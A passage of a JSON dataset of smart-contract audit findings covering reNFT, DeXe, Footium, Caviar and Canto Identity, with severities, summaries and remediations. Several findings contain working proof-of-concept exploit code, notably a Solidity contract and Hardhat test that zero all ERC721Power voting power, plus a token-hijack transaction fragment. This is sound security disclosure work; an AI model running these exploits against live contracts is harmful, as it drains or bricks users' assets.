exploit\n            (bool tx_success, ) = address(attacker.safe).call(\n                hijackTX\n            );\n\n\n            /** ----------------- Exploit proof ----------------- */\n\n            uint256 attackersBalance = erc1155s[0].balanceOf(address(attacker.addr), 0);\n            uint256 attackersSafeBalance = erc1155s[0].balanceOf(address(attacker.safe), 0);\n\n            if (tx_success && attackersSafeBalance == uint256(0) && attackersBalance == uint256(100)) {\n                console.log(\"Tokens successfully hijacked from the attacker's (borrower) safe!\");\n            }\n\n\n        }\n\n    }\n\n\n    interface Safe {\n        function execTransaction(\n            address to,\n            uint256 value,\n            bytes calldata data,\n            Enum.Operation operation,\n            uint256 safeTxGas,\n            uint256 baseGas,\n            uint256 gasPrice,\n            address gasToken,\n            address payable refundReceiver,\n            bytes memory signatures\n        ) external payable returns (bool success);\n\n        function setFallbackHandler(address handler) external;\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nThis severe vulnerability allows an attacker to hijack ANY ERC721 or ERC1155 tokens he rents.\n\n***\n\n### Remediation\n\n***\n\nIn the guard, check if the TX is a call to the function `setFallbackHandler()`. If it is, then ensure that the address supplied to that function is not an address of an actively rented ERC721/1155 token.\nAdditionally, if the borrower rents a new token, ensure that the already set fallback handler address isn't the same as the newly-rented token address.\n\n***\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1912610639):**\n > H seems appropriate here, direct loss of assets. \n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/593#issuecomment-1914950594):**\n > PoC on this one was confirmed. Direct loss of assets.\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/4) - Adds check to prevent setting of the fallback handler by the safe owner.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/42), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/31) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/3).\n\n***\n\n",
      "summary": "\nThe report discusses two features of the Gnosis safe: fallback handlers and guards. Fallback handlers allow for flexibility in handling unknown functions, while guards act as a defense against malicious function calls. However, the report highlights a vulnerability in the guard feature that allows an attacker to hijack any ERC721 or ERC1155 token rented through the safe. The steps to exploit this vulnerability are outlined, and a proof of concept is provided. To run the proof of concept, specific files must be added to the test folder and a command must be run. The report concludes by mentioning the need for validation and checks in the `setFallbackHandler()` function to prevent such attacks.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/593",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "h-02-an-attacker-is-able-to-hijack-any-erc721-erc1155-he-borrows-because-guard-is-missing-validation-on-the-address-supplied-to-function-call-setfallbackhandler-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "27295",
      "kind": "MARKDOWN",
      "auditfirm_id": "11",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "1161",
      "title": "Attacker can destroy user voting power by setting `ERC721Power::totalPower` and all existing NFTs `currentPower` to 0",
      "content": "**Description:** Attacker can destroy user voting power by setting `ERC721Power::totalPower` & all existing nfts' `currentPower` to 0 via a permission-less attack contract by exploiting a discrepancy (\"<\" vs \"<=\") in `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172):\n\n```solidity\nfunction recalculateNftPower(uint256 tokenId) public override returns (uint256 newPower) {\n    // @audit execution allowed to continue when\n    // block.timestamp == powerCalcStartTimestamp\n    if (block.timestamp < powerCalcStartTimestamp) {\n        return 0;\n    }\n    // @audit getNftPower() returns 0 when\n    // block.timestamp == powerCalcStartTimestamp\n    newPower = getNftPower(tokenId);\n\n    NftInfo storage nftInfo = nftInfos[tokenId];\n\n    // @audit as this is the first update since power\n    // calculation has just started, totalPower will be\n    // subtracted by nft's max power\n    totalPower -= nftInfo.lastUpdate != 0 ? nftInfo.currentPower : getMaxPowerForNft(tokenId);\n    // @audit totalPower += 0 (newPower = 0 in above line)\n    totalPower += newPower;\n\n    nftInfo.lastUpdate = uint64(block.timestamp);\n    // @audit will set nft's current power to 0\n    nftInfo.currentPower = newPower;\n}\n\nfunction getNftPower(uint256 tokenId) public view override returns (uint256) {\n    // @audit execution always returns 0 when\n    // block.timestamp == powerCalcStartTimestamp\n    if (block.timestamp <= powerCalcStartTimestamp) {\n        return 0;\n```\nThis attack has to be run on the exact block that power calculation starts (when `block.timestamp == ERC721Power.powerCalcStartTimestamp`).\n\n**Impact:** `ERC721Power::totalPower` & all existing nft's `currentPower` are set 0, negating voting using `ERC721Power` since [`totalPower` is read when creating the snapshot](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L330-L331) and [`GovUserKeeper::getNftsPowerInTokensBySnapshot()` will return 0](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L546-L548) same as if the nft contract didn't exist. Can also negatively affect the ability to [create proposals](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L604-L606).\n\nThis attack is extremely devastating as the individual power of `ERC721Power` nfts can never be increased; it can only decrease over time if the required collateral is not deposited. By setting all nfts' `currentPower = 0` as soon as power calculation starts (`block.timestamp == ERC721Power.powerCalcStartTimestamp`) the `ERC721Power` contract is effectively completely bricked - there is no way to \"undo\" this attack unless the nft contract is replaced with a new contract.\n\nDexe-DAO can be created [using only nfts for voting](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L74); in this case this exploit which completely bricks the voting power of all nfts means a new DAO has to be re-deployed since no one can vote as everyone's voting power has been destroyed.\n\n**Proof of Concept:** Add attack contract `mock/utils/ERC721PowerAttack.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"../../gov/ERC721/ERC721Power.sol\";\n\nimport \"hardhat/console.sol\";\n\ncontract ERC721PowerAttack {\n    // this attack can decrease ERC721Power::totalPower by the true max power of all\n    // the power nfts that exist (to zero), regardless of who owns them, and sets the current\n    // power of all nfts to zero, totally bricking the ERC721Power contract.\n    //\n    // this attack only works when block.timestamp == nftPower.powerCalcStartTimestamp\n    // as it takes advantage of a difference in getNftPower() & recalculateNftPower():\n    //\n    // getNftPower() returns 0 when block.timestamp <= powerCalcStartTimestamp\n    // recalculateNftPower returns 0 when block.timestamp < powerCalcStartTimestamp\n    function attack(\n        address nftPowerAddr,\n        uint256 initialTotalPower,\n        uint256 lastTokenId\n    ) external {\n        ERC721Power nftPower = ERC721Power(nftPowerAddr);\n\n        // verify attack starts on the correct block\n        require(\n            block.timestamp == nftPower.powerCalcStartTimestamp(),\n            \"ERC721PowerAttack: attack requires block.timestamp == nftPower.powerCalcStartTimestamp\"\n        );\n\n        // verify totalPower() correct at starting block\n        require(\n            nftPower.totalPower() == initialTotalPower,\n            \"ERC721PowerAttack: incorrect initial totalPower\"\n        );\n\n        // call recalculateNftPower() for every nft, this:\n        // 1) decreases ERC721Power::totalPower by that nft's max power\n        // 2) sets that nft's currentPower = 0\n        for (uint256 i = 1; i <= lastTokenId; ) {\n            require(\n                nftPower.recalculateNftPower(i) == 0,\n                \"ERC721PowerAttack: recalculateNftPower() should return 0 for new nft power\"\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        require(\n            nftPower.totalPower() == 0,\n            \"ERC721PowerAttack: after attack finished totalPower should equal 0\"\n        );\n    }\n}\n```\n\nAdd test harness to `ERC721Power.test.js`:\n```javascript\n    describe(\"audit attacker can manipulate ERC721Power totalPower\", () => {\n      it(\"audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0\", async () => {\n        // deploy the ERC721Power nft contract with:\n        // max power of each nft = 100\n        // power reduction 10%\n        // required collateral = 100\n        let maxPowerPerNft = toPercent(\"100\");\n        let requiredCollateral = wei(\"100\");\n        let powerCalcStartTime = (await getCurrentBlockTime()) + 1000;\n        // hack needed to start attack contract on exact block due to hardhat\n        // advancing block.timestamp in the background between function calls\n        let powerCalcStartTime2 = (await getCurrentBlockTime()) + 999;\n\n        // create power nft contract\n        await deployNft(powerCalcStartTime, maxPowerPerNft, toPercent(\"10\"), requiredCollateral);\n\n        // ERC721Power::totalPower should be zero as no nfts yet created\n        assert.equal((await nft.totalPower()).toFixed(), toPercent(\"0\").times(1).toFixed());\n\n        // create the attack contract\n        const ERC721PowerAttack = artifacts.require(\"ERC721PowerAttack\");\n        let attackContract = await ERC721PowerAttack.new();\n\n        // create 10 power nfts for SECOND\n        await nft.safeMint(SECOND, 1);\n        await nft.safeMint(SECOND, 2);\n        await nft.safeMint(SECOND, 3);\n        await nft.safeMint(SECOND, 4);\n        await nft.safeMint(SECOND, 5);\n        await nft.safeMint(SECOND, 6);\n        await nft.safeMint(SECOND, 7);\n        await nft.safeMint(SECOND, 8);\n        await nft.safeMint(SECOND, 9);\n        await nft.safeMint(SECOND, 10);\n\n        // verify ERC721Power::totalPower has been increased by max power for all nfts\n        assert.equal((await nft.totalPower()).toFixed(), maxPowerPerNft.times(10).toFixed());\n\n        // fast forward time to the start of power calculation\n        await setTime(powerCalcStartTime2);\n\n        // launch the attack\n        await attackContract.attack(nft.address, maxPowerPerNft.times(10).toFixed(), 10);\n      });\n    });\n```\n\nRun attack with: `npx hardhat test --grep \"audit attack 1 sets ERC721Power totalPower & all nft currentPower to 0\"`\n\n**Recommended Mitigation:** Resolve the discrepancy between `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172).\n\n**Dexe:**\nFixed in [PR174](https://github.com/dexe-network/DeXe-Protocol/commit/8c52fe4264d7868ab261ee789d0efe9f4edddfc2).\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "\nThis bug report is about an attack contract that can be used to exploit a discrepancy in the ERC721Power contract to set the total voting power and the current power of all existing Non-Fungible Tokens (NFTs) to 0. This attack can be run on the exact block that power calculation starts (when `block.timestamp == ERC721Power.powerCalcStartTimestamp`).\n\nThe impact of this attack is that `ERC721Power::totalPower` & all existing nft's `currentPower` are set 0, negating voting using `ERC721Power` since `totalPower` is read when creating the snapshot and `GovUserKeeper::getNftsPowerInTokensBySnapshot()` will return 0 same as if the nft contract didn't exist. It can also negatively affect the ability to create proposals. This attack is extremely devastating as the individual power of `ERC721Power` nfts can never be increased; it can only decrease over time if the required collateral is not deposited.\n\nThe bug was fixed by resolving the discrepancy between `ERC721Power` [L144](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L144) & [L172](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/ERC721Power.sol#L172) and was verified.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 4,
      "general_score": 4,
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "attacker-can-destroy-user-voting-power-by-setting-erc721powertotalpower-and-all-existing-nfts-currentpower-to-0-cyfrin-none-cyfrin-dexe-markdown",
      "firm_name": "Cyfrin",
      "firm_logo_square": "Cyfrin_square.jpg",
      "protocol_name": "Dexe",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Cyfrin",
        "logo_square": "Cyfrin_square.jpg"
      },
      "protocols_protocol": {
        "name": "Dexe",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Algo-Stables"
            },
            "score": 1
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Vote"
          }
        },
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "18608",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 37,
      "protocol_id": "643",
      "title": "M-7: Minting inconsistencies on FootiumPlayer and FootiumClub",
      "content": "Source: https://github.com/sherlock-audit/2023-04-footium-judging/issues/342 \n\n## Found by \n0xAsen, 0xHati, 0xLook, 0xPkhatri, 0xRobocop, 0xStalin, 0xeix, 0xhacksmithh, BAHOZ, Bauchibred, Bauer, Dug, GalloDaSballo, Koolex, PTolev, Phantasmagoria, TheNaubit, Tricko, ali\\_shehab, cergyk, chaithanya\\_gali, ctf\\_sec, cuthalion0x, deadrxsezzz, descharre, indijanc, jasonxiale, kiki\\_dev, lewisbroadhurst, nzm\\_, oualidpro, sashik\\_eth, shame, shogoki, tsueti\\_, tsvetanovv, wzrdk3lly\n## Summary\n\nThe `FootiumClub.sol` contract when minting uses `_mint()` instead of `_safeMint()` which can cause to mint a club to a contract who does not support nfts. On the other hand `FootiumPlayer.sol` uses `_safeMint()`.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\n`FootiumClub.sol` might mint a club NFT to a contract that cannot handle nfts.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-footium/blob/main/footium-eth-shareable/contracts/FootiumClub.sol#L65\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse `_safeMint()` as in FootiumPlayer.",
      "summary": "\nThe bug report is about two contracts, FootiumPlayer.sol and FootiumClub.sol, related to the minting of NFTs. The FootiumClub.sol contract is using the `_mint()` function instead of the `_safeMint()` function, which can cause the contract to mint a club to a contract that does not support NFTs. This issue was found by a group of people, including 0xAsen, 0xHati, 0xLook, 0xPkhatri, 0xRobocop, 0xStalin, 0xeix, 0xhacksmithh, BAHOZ, Bauchibred, Bauer, Dug, GalloDaSballo, Koolex, PTolev, Phantasmagoria, TheNaubit, Tricko, ali_shehab, cergyk, chaithanya_gali, ctf_sec, cuthalion0x, deadrxsezzz, descharre, indijanc, jasonxiale, kiki_dev, lewisbroadhurst, nzm_, oualidpro, sashik_eth, shame, shogoki, tsueti_, tsvetanovv, and wzrdk3lly. The impact of this issue is that FootiumClub.sol might mint a club NFT to a contract that cannot handle NFTs. The code snippet that is related to the issue can be found at https://github.com/sherlock-audit/2023-04-footium/blob/main/footium-eth-shareable/contracts/FootiumClub.sol#L65. The issue was found using manual review. The recommendation is to use `_safeMint()` as in FootiumPlayer.sol.",
      "report_date": {},
      "contest_prize_txt": "11000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/71",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-footium-judging/issues/342",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "71",
      "slug": "m-7-minting-inconsistencies-on-footiumplayer-and-footiumclub-sherlock-none-footium-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Footium",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Footium",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "NFT"
          }
        },
        {
          "tags_tag": {
            "title": "mint vs safeMint"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "18600",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 16,
      "protocol_id": "643",
      "title": "H-1: Escrow approvals are not cleared when club is transferred allowing for abuse after transfer",
      "content": "Source: https://github.com/sherlock-audit/2023-04-footium-judging/issues/289 \n\n## Found by \n0x52, BenRai, Brenzee, CMierez, J4de, MiloTruck, PokemonAuditSimulator, Quantish, cergyk, ctf\\_sec, mstpr-brainbot, pengun, sashik\\_eth, shaka, shogoki, toshii\n## Summary\n\nEscrow approvals remain even across club token transfers. This allows a malicious club owners to sell their club then drain everything after sale due to previous approvals.\n\n## Vulnerability Detail\n\nERC20 and ERC721 token approval persist regardless of the owner of the club. The result is that approvals set by one owner can be accessed after a token has been sold or transferred. This allows the following attack:\n\n1) User A owns clubId = 1\n2) User A sets approval to themselves\n3) User A sells clubId = 1 to User B\n4) User A uses persistent approval to drain all players and tokens\n\n## Impact\n\nMalicious approvals can be used to drain club after sale\n\n## Code Snippet\n\n[FootiumEscrow.sol#L75-L81](https://github.com/sherlock-audit/2023-04-footium/blob/main/footium-eth-shareable/contracts/FootiumEscrow.sol#L75-L81)\n\n[FootiumEscrow.sol#L90-L96](https://github.com/sherlock-audit/2023-04-footium/blob/main/footium-eth-shareable/contracts/FootiumEscrow.sol#L90-L96)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nClub escrow system needs to be redesigned",
      "summary": "\nA bug was discovered in FootiumEscrow.sol that allows malicious club owners to abuse their club after it has been sold or transferred. The bug is that ERC20 and ERC721 token approval persist regardless of the owner of the club. This means that any approvals set by the original owner can be accessed after the club is sold or transferred. This allows the original owner to use the persistent approval to drain all players and tokens from the club after the sale.\n\nThis bug was discovered by 0x52, BenRai, Brenzee, CMierez, J4de, MiloTruck, PokemonAuditSimulator, Quantish, cergyk, ctf_sec, mstpr-brainbot, pengun, sashik_eth, shaka, shogoki, and toshii. The impact of this bug is that malicious approvals can be used to drain club after sale.\n\nThe code snippet that was used to find the bug can be found at FootiumEscrow.sol#L75-L81 and FootiumEscrow.sol#L90-L96. The bug was found using manual review. The recommendation is that the club escrow system needs to be redesigned.",
      "report_date": {},
      "contest_prize_txt": "11000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/71",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-footium-judging/issues/289",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "71",
      "slug": "h-1-escrow-approvals-are-not-cleared-when-club-is-transferred-allowing-for-abuse-after-transfer-sherlock-none-footium-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Footium",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Footium",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "ERC20"
          }
        },
        {
          "tags_tag": {
            "title": "Approve"
          }
        }
      ]
    },
    {
      "id": "16262",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "76",
      "title": "[M-17] The tokenURI method does not check if the NFT has been minted and returns data for the contract that may be a fake NFT",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161\nhttps://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17\n\n\n## Vulnerability details\n\n## Impact\n\n- By invoking the [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) method for a maliciously provided NFT id, the returned data may deceive potential users, as the method will return data for a non-existent NFT id that appears to be a genuine PrivatePool. This can lead to a poor user experience or financial loss for users.\n- Violation of the [ERC721-Metadata part](https://eips.ethereum.org/EIPS/eip-721) standard\n\n## Proof of Concept\n\n- The [Factory.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/Factory.sol#L161) and [PrivatePoolMetadata.tokenURI](https://github.com/code-423n4/2023-04-caviar/blob/cd8a92667bcb6657f70657183769c244d04c015c/src/PrivatePoolMetadata.sol#L17) methods lack any requirements stating that the provided NFT id must be created. We can also see that in the standard implementation by [OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cf86fd9962701396457e50ab0d6cc78aa29a5ebc/contracts/token/ERC721/ERC721.sol#L94), this check is present:\n- [Throws if `_tokenId` is not a valid NFT](https://eips.ethereum.org/EIPS/eip-721)\n\n### Example\n\n1. User creates a fake contract\n   A simple example so that the `tokenURI` method does not revert:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\ncontract NFT {\n    function balanceOf(address) external pure returns (uint256) {\n        1;\n    }\n}\n\ncontract NonNFT {\n    address public immutable nft;\n\n    address public constant baseToken = address(0);\n    uint256 public constant virtualBaseTokenReserves = 1 ether;\n    uint256 public constant virtualNftReserves = 1 ether;\n    uint256 public constant feeRate = 500;\n\n    constructor() {\n        nft = address(new NFT());\n    }\n}\n```\n\n2. User deploy the contract\n3. Now, by using `tokenURI()` for the deployed user's address, one can fetch information about a non-existent NFT.\n\n## Tools Used\n\n- Manual review\n- Foundry\n\n## Recommended Mitigation Steps\n\n- Throw an error if the NFT id is invalid.",
      "summary": "\nThis bug report is about a vulnerability in the Factory.tokenURI and PrivatePoolMetadata.tokenURI methods of the code-423n4/2023-04-caviar repository. This vulnerability could lead to a poor user experience or financial loss for users, as it allows maliciously provided NFT ids to return data for non-existent NFTs that appear to be genuine PrivatePools. \n\nThe vulnerability was identified through manual review and Foundry tools. The proof of concept involved creating a fake contract, deploying it, and then using the tokenURI method for the deployed user's address to fetch information about a non-existent NFT.\n\nThe recommended mitigation step is to throw an error if the NFT id is invalid. This is already present in the standard implementation by OpenZeppelin, and should be implemented in the code-423n4/2023-04-caviar repository as well.",
      "report_date": {},
      "contest_prize_txt": "$47,000 USDC",
      "contest_link": "https://code4rena.com/contests/2023-04-caviar-private-pools",
      "sponsor_name": "Caviar",
      "sponsor_link": "https://twitter.com/caviarAMM",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "https://github.com/code-423n4/2023-04-caviar-findings/issues/44",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "230",
      "slug": "m-17-the-tokenuri-method-does-not-check-if-the-nft-has-been-minted-and-returns-data-for-the-contract-that-may-be-a-fake-nft-code4rena-caviar-caviar-private-pools-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Caviar",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Caviar",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Indexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Token Existence"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "8872",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "44",
      "title": "[M-04] `CidNFT`: Broken `tokenURI` function",
      "content": "\n[`CidNFT#tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L133-L142) does not convert the `uint256 _id` argument to a string before interpolating it in the token URI:\n\n```solidity\n    /// @notice Get the token URI for the provided ID\n    /// @param _id ID to retrieve the URI for\n    /// @return tokenURI The URI of the queried token (path to a JSON file)\n    function tokenURI(uint256 _id) public view override returns (string memory) {\n        if (ownerOf[_id] == address(0))\n            // According to ERC721, this revert for non-existing tokens is required\n            revert TokenNotMinted(_id);\n        return string(abi.encodePacked(baseURI, _id, \".json\"));\n    }\n\n```\n\nThis means the raw bytes of the 32-byte ABI encoded integer `_id` will be interpolated into the token URI, e.g. `0x0000000000000000000000000000000000000000000000000000000000000001` for ID `#1`.\n\nMost of the resulting UTF-8 strings will be malformed, incorrect, or invalid URIs. For example, token ID `#1` will show up as the invisible \"start of heading\" control character, and ID `#42` will show as the asterisk symbol `*`. URI-unsafe characters will break the token URIs altogether.\n\n### Impact\n\n*   `CidNFT` tokens will have invalid `tokenURI`s. Offchain tools that read the `tokenURI` view may break or display malformed data.\n\n### Suggestion\n\nConvert the `_id` to a string before calling `abi.encodePacked`. Latest Solmate includes a `LibString` helper library for this purpose:\n\n```solidity\n    import \"solmate/utils/LibString.sol\";\n\n    /// @notice Get the token URI for the provided ID\n    /// @param _id ID to retrieve the URI for\n    /// @return tokenURI The URI of the queried token (path to a JSON file)\n    function tokenURI(uint256 _id) public view override returns (string memory) {\n        if (ownerOf[_id] == address(0))\n            // According to ERC721, this revert for non-existing tokens is required\n            revert TokenNotMinted(_id);\n        return string(abi.encodePacked(baseURI, LibString.toString(_id), \".json\"));\n    }\n\n```\n\n### Test case\n\n```solidity\n    function test_InvalidTokenURI() public {\n        uint256 id1 = cidNFT.numMinted() + 1;\n        uint256 id2 = cidNFT.numMinted() + 2;\n        // mint id1\n        cidNFT.mint(new bytes[](0));\n        // mint id2\n        cidNFT.mint(new bytes[](0));\n\n        // These pass â€” the raw bytes '0000000000000000000000000000000000000000000000000000000000000001' are interpolated as _id.\n        assertEq(string(bytes(hex\"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000012e6a736f6e\")), cidNFT.tokenURI(id1));\n        assertEq(string(bytes(hex\"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000022e6a736f6e\")), cidNFT.tokenURI(id2));\n\n        // These fail - the generated string on the right is not the expected string on the left. \n        assertEq(\"tbd://base_uri/1.json\", cidNFT.tokenURI(id1));\n        assertEq(\"tbd://base_uri/2.json\", cidNFT.tokenURI(id2));\n    }\n```\n\n**[OpenCoreCH (Canto Identity) confirmed and commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89#issuecomment-1426179080):**\n > Great catch!\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding an issue in the CidNFT smart contract. The vulnerability is that the uint256 _id argument is not converted to a string before being interpolated into the token URI. This means that the raw bytes of the 32-byte ABI encoded integer _id will be interpolated into the token URI, resulting in malformed, incorrect, or invalid URIs. The impact of this is that the CidNFT tokens will have invalid tokenURI's. This can lead to offchain tools that read the tokenURI view breaking or displaying malformed data.\n\nThe suggested solution is to convert the _id to a string before calling abi.encodePacked. This can be done using the LibString helper library included in the latest version of Solmate. A test case has been provided to demonstrate the issue.\n\nIn conclusion, this bug report covers a vulnerability in the CidNFT smart contract, which can lead to invalid tokenURI's. The suggested solution is to convert the _id to a string before calling abi.encodePacked using the LibString helper library.",
      "report_date": {},
      "contest_prize_txt": "$36,500 worth of CANTO",
      "contest_link": "https://code4rena.com/contests/2023-01-canto-identity-protocol-contest",
      "sponsor_name": "Canto Identity Protocol",
      "sponsor_link": "https://twitter.com/CantoIdentity",
      "quality_score": 5,
      "general_score": 4.0216169476869865,
      "source_link": "https://code4rena.com/reports/2023-01-canto-identity",
      "github_link": "https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "212",
      "slug": "m-04-cidnft-broken-tokenuri-function-code4rena-canto-identity-protocol-canto-identity-protocol-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Canto Identity Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Canto Identity Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
